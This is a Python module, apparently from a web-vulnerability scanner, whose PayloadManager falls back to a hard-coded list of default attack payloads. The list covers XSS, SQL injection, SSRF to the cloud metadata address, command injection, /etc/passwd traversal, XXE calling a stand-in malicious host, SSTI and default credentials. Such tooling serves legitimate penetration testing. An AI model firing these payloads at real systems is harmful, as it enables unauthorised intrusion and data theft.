from mr_h4shtag.core.logger import Logger
from mr_h4shtag.core.database import DatabaseManager

class PayloadManager:
    @staticmethod
    def fetch_payloads(vuln_type: str, db_manager: DatabaseManager) -> list:
        """
        Fetch payloads for a specific vulnerability type from the database.
        """
        Logger.info(f"Fetching payloads for {vuln_type}...")
        payloads = db_manager.get_payloads(vuln_type)
        if not payloads:
            Logger.warning(f"No payloads found for {vuln_type}. Using default payloads.")
            default_payloads = {
                'xss': ['<script>alert(1)</script>', '"><script>alert(1)</script>'],
                'sqli': ["' OR 1=1 --", "1' UNION SELECT NULL --"],
                'ssrf': ['http://169.254.169.254/latest/meta-data/', 'http://localhost:8080'],
                'idor': ['id=1', 'id=2'],
                'rce': ['; ls', '| whoami'],
                'lfi': ['../../etc/passwd', '../config.php'],
                'xxe': ['<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>', '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://malicious.com">]><root>&xxe;</root>'],
                'ssti': ['{{7*7}}', '${{7*7}}'],
                'redirect': ['/redirect?url=http://malicious.com', '//malicious.com'],
                'csrf': ['<form action="http://malicious.com">', '<img src="http://malicious.com">'],
                'auth_bypass': ['admin=1', 'role=admin'],
                'file_upload': ['shell.php', 'test.jpg'],
                'session_hijack': ['session=abc123', 'token=xyz789'],
                'brute_force': ['admin:admin', 'user:password123'],
                'misconfig': ['debug=true', 'config=show'],
                'cors': ['Origin: http://malicious.com', 'Access-Control-Allow-Origin: *'],
                'api_rate_limit': ['GET /api/v1/data HTTP/1.1', 'POST /api/v1/login'],
                'graphql': ['query { user(id: 1) { name } }', 'mutation { login(user: "admin") }'],
                'websocket': ['ws://example.com/socket', 'wss://malicious.com']
            }
            payloads = default_payloads.get(vuln_type, [])
        Logger.info(f"Retrieved {len(payloads)} payloads for {vuln_type}.")
        return payloads